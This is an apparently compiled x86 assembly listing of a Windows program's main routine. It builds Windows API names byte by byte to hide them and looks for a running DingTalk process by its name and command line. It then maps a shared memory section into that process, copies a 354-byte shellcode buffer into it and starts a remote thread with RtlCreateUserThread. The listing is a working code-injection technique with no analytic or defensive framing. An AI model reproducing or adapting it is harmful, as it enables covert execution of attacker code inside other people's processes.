...
_TEXT	SEGMENT
_peb$1 = -1524						; size = 472
_Param$2 = -1052					; size = 72
_pbi$ = -980						; size = 24
__LoadLibraryA$ = -956					; size = 4
_sectionSize$ = -952					; size = 8
_fRtlCreateUserThread$ = -944				; size = 4
_targetThreadHandle$ = -940				; size = 4
_hCurrent$ = -936					; size = 4
__GetCurrentProcess$ = -932				; size = 4
_fNtCreateSection$ = -928				; size = 4
_dwPatternLength$ = -924				; size = 4
_status2$3 = -920					; size = 4
_fNtQueryInformationProcess$ = -916			; size = 4
_status$ = -912						; size = 4
_fNtQuerySystemInformation$ = -908			; size = 4
_uReturnedLEngth$ = -904				; size = 4
_usPathLen$ = -900					; size = 2
_usCmdLen$4 = -896					; size = 2
_usPathLen$5 = -892					; size = 2
_usCmdLen$ = -888					; size = 2
_dingtalk_pattern$ = -884				; size = 54
_dingtalk_upper$ = -828					; size = 26
_dingtalk$ = -800					; size = 26
_kernel32_dll_name$ = -772				; size = 26
_get_proc$ = -744					; size = 4
_load_lib$ = -740					; size = 4
_targetHandle$ = -736					; size = 4
_fNtMapViewOfSection$ = -732				; size = 4
__OpenProcess$ = -728					; size = 4
__VirtualFree$ = -724					; size = 4
_bMatch$6 = -720					; size = 4
__VirtualAlloc$ = -716					; size = 4
_isDingtalk$7 = -712					; size = 4
_remoteSectionAddress$ = -708				; size = 4
_localSectionAddress$ = -704				; size = 4
_sectionHandle$ = -700					; size = 4
_size$ = -696						; size = 4
_dwBufferLength$8 = -692				; size = 4
_dwID$ = -688						; size = 4
__ReadProcessMemory$ = -684				; size = 4
_shellcode$ = -680					; size = 354
_nt_query_information_process_name$ = -324		; size = 26
_nt_query_system_information_name$ = -296		; size = 25
_rtl_create_user_thread_name$ = -268			; size = 20
_nt_map_view_of_section_name$ = -248			; size = 19
_read_process_memory_name$ = -228			; size = 18
_get_current_process_name$ = -208			; size = 18
_get_module_handlea_name$ = -188			; size = 17
_nt_create_section_name$ = -168				; size = 16
_get_proc_name$ = -152					; size = 15
_virtual_alloc_name$ = -136				; size = 13
_load_lib_name$ = -120					; size = 13
_open_process_name$ = -104				; size = 12
_virtual_free_name$ = -92				; size = 12
_nParamIndex$9 = -80					; size = 4
_nPebIndex$10 = -76					; size = 4
_pImageName$ = -72					; size = 4
_nByteIndex$11 = -68					; size = 4
_dwNetWorkInstPID$ = -64				; size = 4
_pInfo$ = -60						; size = 4
_pIndexOfCmdLine$12 = -56				; size = 4
_hProcess$ = -52					; size = 4
__GetModuleHandleA$ = -48				; size = 4
_iIndex$13 = -44					; size = 4
_pCmdLine$14 = -40					; size = 4
_nCount$15 = -36					; size = 4
_nImageNameLength$ = -32				; size = 4
_ntdll_name$ = -28					; size = 6
_nIndex$16 = -20					; size = 4
_dwRead$17 = -16					; size = 4
_pSystemInformation$ = -12				; size = 4
_base$ = -8						; size = 4
__GetProcAddress$ = -4					; size = 4
_main	PROC
...
; Line 106
	...
	mov	BYTE PTR _ntdll_name$[ebp+5], 0
; Line 107
	mov	BYTE PTR _nt_create_section_name$[ebp], 78 ; 0000004eH
	mov	BYTE PTR _nt_create_section_name$[ebp+1], 116 ; 00000074H
	mov	BYTE PTR _nt_create_section_name$[ebp+2], 67 ; 00000043H
	mov	BYTE PTR _nt_create_section_name$[ebp+3], 114 ; 00000072H
	mov	BYTE PTR _nt_create_section_name$[ebp+4], 101 ; 00000065H
	mov	BYTE PTR _nt_create_section_name$[ebp+5], 97 ; 00000061H
	mov	BYTE PTR _nt_create_section_name$[ebp+6], 116 ; 00000074H
	mov	BYTE PTR _nt_create_section_name$[ebp+7], 101 ; 00000065H
	mov	BYTE PTR _nt_create_section_name$[ebp+8], 83 ; 00000053H
	mov	BYTE PTR _nt_create_section_name$[ebp+9], 101 ; 00000065H
	mov	BYTE PTR _nt_create_section_name$[ebp+10], 99 ; 00000063H
	mov	BYTE PTR _nt_create_section_name$[ebp+11], 116 ; 00000074H
	mov	BYTE PTR _nt_create_section_name$[ebp+12], 105 ; 00000069H
	mov	BYTE PTR _nt_create_section_name$[ebp+13], 111 ; 0000006fH
	mov	BYTE PTR _nt_create_section_name$[ebp+14], 110 ; 0000006eH
	mov	BYTE PTR _nt_create_section_name$[ebp+15], 0
; Line 108
	mov	BYTE PTR _nt_map_view_of_section_name$[ebp], 78 ; 0000004eH
	mov	BYTE PTR _nt_map_view_of_section_name$[ebp+1], 116 ; 00000074H
	mov	BYTE PTR _nt_map_view_of_section_name$[ebp+2], 77 ; 0000004dH
	mov	BYTE PTR _nt_map_view_of_section_name$[ebp+3], 97 ; 00000061H
	mov	BYTE PTR _nt_map_view_of_section_name$[ebp+4], 112 ; 00000070H
	mov	BYTE PTR _nt_map_view_of_section_name$[ebp+5], 86 ; 00000056H
	mov	BYTE PTR _nt_map_view_of_section_name$[ebp+6], 105 ; 00000069H
	mov	BYTE PTR _nt_map_view_of_section_name$[ebp+7], 101 ; 00000065H
	mov	BYTE PTR _nt_map_view_of_section_name$[ebp+8], 119 ; 00000077H
	mov	BYTE PTR _nt_map_view_of_section_name$[ebp+9], 79 ; 0000004fH
	mov	BYTE PTR _nt_map_view_of_section_name$[ebp+10], 102 ; 00000066H
	mov	BYTE PTR _nt_map_view_of_section_name$[ebp+11], 83 ; 00000053H
	mov	BYTE PTR _nt_map_view_of_section_name$[ebp+12], 101 ; 00000065H
	mov	BYTE PTR _nt_map_view_of_section_name$[ebp+13], 99 ; 00000063H
	mov	BYTE PTR _nt_map_view_of_section_name$[ebp+14], 116 ; 00000074H
	mov	BYTE PTR _nt_map_view_of_section_name$[ebp+15], 105 ; 00000069H
	mov	BYTE PTR _nt_map_view_of_section_name$[ebp+16], 111 ; 0000006fH
	mov	BYTE PTR _nt_map_view_of_section_name$[ebp+17], 110 ; 0000006eH
	mov	BYTE PTR _nt_map_view_of_section_name$[ebp+18], 0
; Line 109
...
; Line 111
	mov	BYTE PTR _rtl_create_user_thread_name$[ebp], 82 ; 00000052H
	mov	BYTE PTR _rtl_create_user_thread_name$[ebp+1], 116 ; 00000074H
	mov	BYTE PTR _rtl_create_user_thread_name$[ebp+2], 108 ; 0000006cH
	mov	BYTE PTR _rtl_create_user_thread_name$[ebp+3], 67 ; 00000043H
	mov	BYTE PTR _rtl_create_user_thread_name$[ebp+4], 114 ; 00000072H
	mov	BYTE PTR _rtl_create_user_thread_name$[ebp+5], 101 ; 00000065H
	mov	BYTE PTR _rtl_create_user_thread_name$[ebp+6], 97 ; 00000061H
	mov	BYTE PTR _rtl_create_user_thread_name$[ebp+7], 116 ; 00000074H
	mov	BYTE PTR _rtl_create_user_thread_name$[ebp+8], 101 ; 00000065H
	mov	BYTE PTR _rtl_create_user_thread_name$[ebp+9], 85 ; 00000055H
	mov	BYTE PTR _rtl_create_user_thread_name$[ebp+10], 115 ; 00000073H
	mov	BYTE PTR _rtl_create_user_thread_name$[ebp+11], 101 ; 00000065H
	mov	BYTE PTR _rtl_create_user_thread_name$[ebp+12], 114 ; 00000072H
	mov	BYTE PTR _rtl_create_user_thread_name$[ebp+13], 84 ; 00000054H
	mov	BYTE PTR _rtl_create_user_thread_name$[ebp+14], 104 ; 00000068H
	mov	BYTE PTR _rtl_create_user_thread_name$[ebp+15], 114 ; 00000072H
	mov	BYTE PTR _rtl_create_user_thread_name$[ebp+16], 101 ; 00000065H
	mov	BYTE PTR _rtl_create_user_thread_name$[ebp+17], 97 ; 00000061H
	mov	BYTE PTR _rtl_create_user_thread_name$[ebp+18], 100 ; 00000064H
	mov	BYTE PTR _rtl_create_user_thread_name$[ebp+19], 0
; Line 114
...
; Line 181
	lea	ecx, DWORD PTR _nt_create_section_name$[ebp]
	push	ecx
	...
	push	eax
	call	DWORD PTR __GetProcAddress$[ebp]
	mov	DWORD PTR _fNtCreateSection$[ebp], eax
; Line 182
	lea	eax, DWORD PTR _nt_map_view_of_section_name$[ebp]
	push	eax
	...
	push	eax
	call	DWORD PTR __GetProcAddress$[ebp]
	mov	DWORD PTR _fNtMapViewOfSection$[ebp], eax
; Line 183
	lea	edx, DWORD PTR _rtl_create_user_thread_name$[ebp]
	push	edx
	lea	eax, DWORD PTR _ntdll_name$[ebp]
	push	eax
	call	DWORD PTR __GetModuleHandleA$[ebp]
	push	eax
	call	DWORD PTR __GetProcAddress$[ebp]
	mov	DWORD PTR _fRtlCreateUserThread$[ebp], eax
; Line 184
...
$LN33@main:
; Line 222
	mov	DWORD PTR _isDingtalk$7[ebp], 1
; Line 223
	mov	DWORD PTR _nIndex$16[ebp], 0
	jmp	SHORT $LN9@main
$LN7@main:
	mov	eax, DWORD PTR _nIndex$16[ebp]
	add	eax, 1
	mov	DWORD PTR _nIndex$16[ebp], eax
$LN9@main:
	mov	ecx, DWORD PTR _nIndex$16[ebp]
	cmp	ecx, DWORD PTR _nImageNameLength$[ebp]
	jge	SHORT $LN8@main
; Line 224
	mov	edx, DWORD PTR _nIndex$16[ebp]
	...
	je	SHORT $LN34@main
; Line 225
	mov	DWORD PTR _isDingtalk$7[ebp], 0
; Line 226
	jmp	SHORT $LN8@main
$LN34@main:
; Line 228
...
$LN8@main:
; Line 230
	cmp	DWORD PTR _isDingtalk$7[ebp], 0
	jne	SHORT $LN35@main
; Line 231
	jmp	$LN2@main
$LN35@main:
...
$LN10@main:
	...
	add	edx, 1
	mov	DWORD PTR _nPebIndex$10[ebp], edx
$LN12@main:
	cmp	DWORD PTR _nPebIndex$10[ebp], 472	; 000001d8H
	jae	SHORT $LN11@main
; Line 244
	mov	eax, DWORD PTR _nPebIndex$10[ebp]
...
$LN13@main:
	...
	add	ecx, 1
	mov	DWORD PTR _nParamIndex$9[ebp], ecx
$LN15@main:
	cmp	DWORD PTR _nParamIndex$9[ebp], 72	; 00000048H
	jae	SHORT $LN14@main
; Line 248
	mov	edx, DWORD PTR _nParamIndex$9[ebp]
...
; Line 250
	xor	eax, eax
	mov	WORD PTR _usCmdLen$4[ebp], ax
; Line 251
	xor	ecx, ecx
	mov	WORD PTR _usPathLen$5[ebp], cx
; Line 252
	mov	DWORD PTR _dwRead$17[ebp], 0
; Line 253
	lea	edx, DWORD PTR _dwRead$17[ebp]
	push	edx
	push	472					; 000001d8H
...
; Line 254
	cmp	DWORD PTR _dwRead$17[ebp], 0
	jne	SHORT $LN37@main
; Line 255
	jmp	$LN2@main
$LN37@main:
; Line 257
	mov	DWORD PTR _dwRead$17[ebp], 0
; Line 258
	lea	eax, DWORD PTR _dwRead$17[ebp]
	push	eax
	push	72					; 00000048H
...
; Line 266
	...
	push	0
	call	DWORD PTR __VirtualAlloc$[ebp]
	mov	DWORD PTR _pCmdLine$14[ebp], eax
; Line 267
	cmp	DWORD PTR _pCmdLine$14[ebp], 0
	jne	SHORT $LN40@main
; Line 268
	jmp	$LN2@main
$LN40@main:
; Line 270
	mov	DWORD PTR _nByteIndex$11[ebp], 0
	jmp	SHORT $LN18@main
$LN16@main:
	mov	ecx, DWORD PTR _nByteIndex$11[ebp]
	add	ecx, 1
	mov	DWORD PTR _nByteIndex$11[ebp], ecx
$LN18@main:
	mov	edx, DWORD PTR _nByteIndex$11[ebp]
	cmp	edx, DWORD PTR _dwBufferLength$8[ebp]
	jae	SHORT $LN17@main
; Line 271
	mov	eax, DWORD PTR _pCmdLine$14[ebp]
	add	eax, DWORD PTR _nByteIndex$11[ebp]
	mov	BYTE PTR [eax], 0
; Line 272
	jmp	SHORT $LN16@main
$LN17@main:
; Line 273
	mov	DWORD PTR _dwRead$17[ebp], 0
; Line 274
	lea	ecx, DWORD PTR _dwRead$17[ebp]
	push	ecx
...
; Line 278
	mov	eax, DWORD PTR _pCmdLine$14[ebp]
	mov	DWORD PTR _pIndexOfCmdLine$12[ebp], eax
$LN19@main:
; Line 281
	mov	ecx, DWORD PTR _pIndexOfCmdLine$12[ebp]
	movzx	edx, WORD PTR [ecx]
	test	edx, edx
	je	SHORT $LN20@main
; Line 282
	mov	DWORD PTR _bMatch$6[ebp], 1
; Line 283
	mov	DWORD PTR _nCount$15[ebp], 0
	jmp	SHORT $LN23@main
$LN21@main:
	mov	eax, DWORD PTR _nCount$15[ebp]
	add	eax, 1
	mov	DWORD PTR _nCount$15[ebp], eax
$LN23@main:
	mov	ecx, DWORD PTR _nCount$15[ebp]
	cmp	ecx, DWORD PTR _dwPatternLength$[ebp]
	jae	SHORT $LN22@main
; Line 284
	mov	edx, DWORD PTR _nCount$15[ebp]
	mov	eax, DWORD PTR _pIndexOfCmdLine$12[ebp]
	movzx	ecx, WORD PTR [eax+edx*2]
	mov	edx, DWORD PTR _nCount$15[ebp]
...
$LN43@main:
; Line 293
	mov	edx, DWORD PTR _pIndexOfCmdLine$12[ebp]
	add	edx, 2
	mov	DWORD PTR _pIndexOfCmdLine$12[ebp], edx
; Line 294
	jmp	SHORT $LN19@main
$LN20@main:
; Line 295
	...
	mov	eax, DWORD PTR _dwBufferLength$8[ebp]
	push	eax
	mov	ecx, DWORD PTR _pCmdLine$14[ebp]
	push	ecx
...
$LN45@main:
; Line 306
	mov	DWORD PTR _size$[ebp], 354		; 00000162H
; Line 307
	mov	eax, DWORD PTR _size$[ebp]
	mov	DWORD PTR _sectionSize$[ebp], eax
	xor	ecx, ecx
	mov	DWORD PTR _sectionSize$[ebp+4], ecx
; Line 308
	mov	DWORD PTR _sectionHandle$[ebp], 0
; Line 309
	mov	DWORD PTR _localSectionAddress$[ebp], 0
; Line 310
	mov	DWORD PTR _remoteSectionAddress$[ebp], 0
; Line 311
	push	0
	push	134217728				; 08000000H
	push	64					; 00000040H
	lea	edx, DWORD PTR _sectionSize$[ebp]
	push	edx
	push	0
	push	14					; 0000000eH
	lea	eax, DWORD PTR _sectionHandle$[ebp]
	push	eax
	call	DWORD PTR _fNtCreateSection$[ebp]
; Line 314
	call	DWORD PTR __GetCurrentProcess$[ebp]
	mov	DWORD PTR _hCurrent$[ebp], eax
; Line 315
	push	4
	push	0
	push	2
	...
	push	0
	push	0
	lea	edx, DWORD PTR _localSectionAddress$[ebp]
	push	edx
	mov	eax, DWORD PTR _hCurrent$[ebp]
	push	eax
	mov	ecx, DWORD PTR _sectionHandle$[ebp]
	push	ecx
	call	DWORD PTR _fNtMapViewOfSection$[ebp]
; Line 316
	cmp	DWORD PTR _localSectionAddress$[ebp], 0
	jne	SHORT $LN46@main
; Line 317
	mov	eax, 1
	jmp	$LN1@main
...
; Line 321
	...
	call	DWORD PTR __OpenProcess$[ebp]
	mov	DWORD PTR _targetHandle$[ebp], eax
; Line 322
	push	32					; 00000020H
	push	0
	push	2
	...
	push	0
	push	0
	lea	ecx, DWORD PTR _remoteSectionAddress$[ebp]
	push	ecx
	mov	edx, DWORD PTR _targetHandle$[ebp]
	push	edx
	mov	eax, DWORD PTR _sectionHandle$[ebp]
	push	eax
	call	DWORD PTR _fNtMapViewOfSection$[ebp]
; Line 323
	cmp	DWORD PTR _remoteSectionAddress$[ebp], 0
	jne	SHORT $LN47@main
; Line 324
	mov	eax, 1
	jmp	SHORT $LN1@main
$LN47@main:
; Line 329
	mov	DWORD PTR _iIndex$13[ebp], 0
	jmp	SHORT $LN26@main
$LN24@main:
	mov	ecx, DWORD PTR _iIndex$13[ebp]
	add	ecx, 1
	mov	DWORD PTR _iIndex$13[ebp], ecx
$LN26@main:
	cmp	DWORD PTR _iIndex$13[ebp], 354		; 00000162H
	jae	SHORT $LN25@main
; Line 330
	mov	edx, DWORD PTR _localSectionAddress$[ebp]
	add	edx, DWORD PTR _iIndex$13[ebp]
	mov	eax, DWORD PTR _iIndex$13[ebp]
	mov	cl, BYTE PTR _shellcode$[ebp+eax]
	mov	BYTE PTR [edx], cl
; Line 331
	jmp	SHORT $LN24@main
$LN25@main:
; Line 333
	mov	DWORD PTR _targetThreadHandle$[ebp], 0
; Line 334
	push	0
	lea	edx, DWORD PTR _targetThreadHandle$[ebp]
	push	edx
	push	0
	mov	eax, DWORD PTR _remoteSectionAddress$[ebp]
	push	eax
	push	0
	push	0
	push	0
	...
	push	ecx
	call	DWORD PTR _fRtlCreateUserThread$[ebp]
; Line 335
	xor	eax, eax
$LN1@main:
; Line 336
